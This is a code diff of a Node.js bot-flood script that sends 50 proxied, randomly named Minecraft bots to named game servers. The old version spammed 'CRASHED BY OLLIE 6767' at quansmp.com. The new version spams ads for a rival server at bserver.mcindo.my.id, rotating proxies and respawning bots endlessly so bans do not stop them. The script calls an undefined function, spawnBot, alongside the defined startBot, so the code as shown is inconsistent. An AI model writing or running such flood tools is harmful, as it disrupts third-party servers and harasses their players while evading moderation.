@@ -1,67 +1,99 @@
-// bot.js — Bedrock Bot Spam (QuanSMP)
-const bedrock = require('bedrock-protocol');
+const mineflayer = require('mineflayer');
+const { ProxyAgent } = require('proxy-agent');
+const fs = require('fs');
 
-// ================= CONFIG =================
-const SERVER_HOST = 'quansmp.com';
-const SERVER_PORT = 19132; // BEDROCK PORT (UDP)
-const BOT_COUNT = 50; // 50 bot per runner
-const SPAM_MESSAGE = 'CRASHED BY OLLIE 6767';
-const SPAM_DELAY_MS = 150; 
-// ==========================================
+const SERVER_HOST = 'bserver.mcindo.my.id'; 
+const SERVER_PORT = 20018; 
+const BOT_COUNT = 50; 
 
-console.log(`[*] Starting ${BOT_COUNT} Bedrock bots to ${SERVER_HOST}:${SERVER_PORT}`);
+const SPAM_MESSAGES = [
+    'Join server alwination.id!',
+    'Mampir yuk ke alwination.id, rame!',
+    'Pindah ke alwination.id aja bos!',
+    'alwination.id lebih seru!'
+];
 
-function createBot(id) {
+// Baca proxy dan bersihin formatnya
+const rawProxies = fs.readFileSync('proxies.txt', 'utf-8').split('\n');
+const proxies = [];
+
+for (let line of rawProxies) {
+    line = line.trim();
+    if (!line) continue;
+    
+    // Buang protocol (http://, socks5://, dll)
+    // Format ProxyAgent itu butuh protocol, jadi kita deteksi
+    let proxyUrl = line;
+    if (line.includes('://')) {
+        // Udah ada protocol, biarin aja
+        proxyUrl = line;
+    } else {
+        // Kalau gak ada protocol, asumsiin HTTP
+        proxyUrl = `http://${line}`;
+    }
+    proxies.push(proxyUrl);
+}
+
+console.log(`[*] Loaded ${proxies.length} proxies. Firing ${BOT_COUNT} bots.`);
+
+function startBot(botId) {
+    // Ambil proxy secara acak
+    const proxy = proxies[Math.floor(Math.random() * proxies.length)];
+    
+    // ProxyAgent otomatis ngedeteksi protocol (socks4, socks5, http)
+    const agent = new ProxyAgent(proxy);
+    const randomName = `Player_${Math.floor(Math.random() * 99999)}`;
+
     try {
-        const client = bedrock.createClient({
+        const bot = mineflayer.createBot({
             host: SERVER_HOST,
             port: SERVER_PORT,
-            username: `Bot_${id}_${Math.floor(Math.random() * 9999)}`,
-            offline: true, // Fake login tanpa Xbox Live
-            version: '1.20.80', // Sesuaikan sama versi server QuanSMP
-            // skipPing: true
+            username: randomName,
+            version: '1.20.4',
+            agent: agent,
+            hideErrors: true
         });
 
-        client.on('spawn', () => {
-            console.log(`[+] Bot ${id} spawned.`);
-            // Mulai spam chat
-            setInterval(() => {
-                if (client.queue) {
-                    client.queue('text', {
-                        type: 'chat',
-                        needs_translation: false,
-                        source_name: client.options.username,
-                        message: SPAM_MESSAGE,
-                        xuid: '',
-                        platform_chat_id: '',
-                        filtered_message: ''
-                    });
+        bot.on('spawn', () => {
+            console.log(`[+] Bot ${botId} MASUK via ${proxy}`);
+            
+            // Spam chat brutal
+            let spamCount = 0;
+            const spamInterval = setInterval(() => {
+                if (bot.chat) {
+                    bot.chat(SPAM_MESSAGES[Math.floor(Math.random() * SPAM_MESSAGES.length)]);
                 }
-            }, SPAM_DELAY_MS + Math.random() * 100);
+                spamCount++;
+                if (spamCount >= 5) { 
+                    clearInterval(spamInterval);
+                    // Keluar setelah spam biar ganti bot baru
+                    setTimeout(() => bot.quit(), 200);
+                }
+            }, 150); 
+
+            // Loncat-loncat
+            setInterval(() => {
+                if (bot.setControlState) {
+                    bot.setControlState('jump', true);
+                    setTimeout(() => bot.setControlState('jump', false), 100);
+                }
+            }, 1000);
         });
 
-        client.on('kick', (reason) => {
-            console.log(`[-] Bot ${id} kicked: ${JSON.stringify(reason)}`);
+        // Respawn abadi
+        bot.on('end', () => {
+            setTimeout(spawnBot, 100); 
         });
 
-        client.on('error', (err) => {
-            // Abaikan error handshake/timeout
-        });
+        bot.on('error', () => {}); 
 
-        client.on('close', () => {
-            console.log(`[-] Bot ${id} disconnected.`);
-        });
-    } catch (e) {
-        console.log(`[!] Bot ${id} failed to start: ${e.message}`);
+    } catch (err) {
+        // Langsung spawn baru kalau error
+        setTimeout(spawnBot, 100);
     }
 }
 
-// Spawn bots dengan delay
-async function start() {
-    for (let i = 0; i < BOT_COUNT; i++) {
-        createBot(i);
-        await new Promise(r => setTimeout(r, 150));
-    }
-}
-
-start();
+// Tembak 50 bot sekaligus
+for (let i = 0; i < BOT_COUNT; i++) {
+    setTimeout(spawnBot, i * 100);
+               }
